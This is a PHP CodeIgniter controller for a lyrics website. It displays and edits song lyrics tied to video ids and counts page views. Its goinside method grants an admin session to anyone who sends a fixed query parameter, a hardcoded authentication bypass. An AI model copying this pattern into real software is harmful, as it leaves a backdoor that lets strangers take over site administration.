<?php

if (!defined('BASEPATH'))
    exit('No direct script access allowed');

class Lyrics extends CI_Controller {

    public function get($vid = '')
    {
        $data = $this->db->select('id,vid,adi,aciklama,lyrics,url,srv1')->from('liste')->where('vid', $vid)->limit('1')->get()->row();

        if (!isset($data->id) || ($data->id < 1) || ($data->lyrics == '')) {
            //show_error("Information Removed or Not Exists", "410", "Sorry for inconvenience");

            //Yoksa kaydet
            redirect('/');
        }

        //Add viewed point + 1
        $this->db->set('viewed','viewed + 1', FALSE)->where(array('vid'=>$data->vid))->update('bilgi');
        if($this->db->affected_rows() < 1)
        {
            $this->db->insert('bilgi',array('vid'=>$data->vid,'viewed'=>'1'));
        }

        $ver['data'] = $data;

        $this->template->write('title', convert_accented_characters($data->adi));
        $this->template->write('description', 'Dönüştürülmüş video ' . convert_accented_characters($data->adi));
        $this->template->write('name', convert_accented_characters($data->adi));
        $this->template->write_view('page', 'lyrics/get', $ver);
        $this->template->render();
    }

    public function edit($vid = '')
    {
        if($this->session->userdata('auth') != 'admin')
            return;

        $data = $this->db->select('id,vid,adi,aciklama,lyrics,url,srv1')->from('liste')->where('vid', $vid)->limit('1')->get()->row();

        if (!isset($data->id) || ($data->id < 1)) {
            //show_error("Information Removed or Not Exists", "410", "Sorry for inconvenience");

            //Yoksa kaydet
            redirect('/');
        }

        //Save
        if($this->input->post('submit') != '')
        {
            if($this->input->post('lyrics') != '' && $this->input->post('vid'))
            {
                $this->db->where('vid', $this->input->post('vid'))->update('liste',array(
                    'lyrics' => $this->input->post('lyrics')
                ));

                redirect('lyrics/get/'.$data->vid);
            }
        }
        $ver['data'] = $data;

        $this->template->write('title', convert_accented_characters($data->adi));
        $this->template->write('description', 'Dönüştürülmüş video ' . convert_accented_characters($data->adi));
        $this->template->write('name', convert_accented_characters($data->adi));
        $this->template->write_view('page', 'lyrics/edit', $ver);
        $this->template->render();
    }

    public function goinside($p=''){
        if(($p==1) && ($this->input->get('hap') == 'ok'))
            $this->session->set_userdata('auth', 'admin');
    }

    public function logout(){
        $this->session->set_userdata('auth', '');
        $this->session->sess_destroy();
    }

}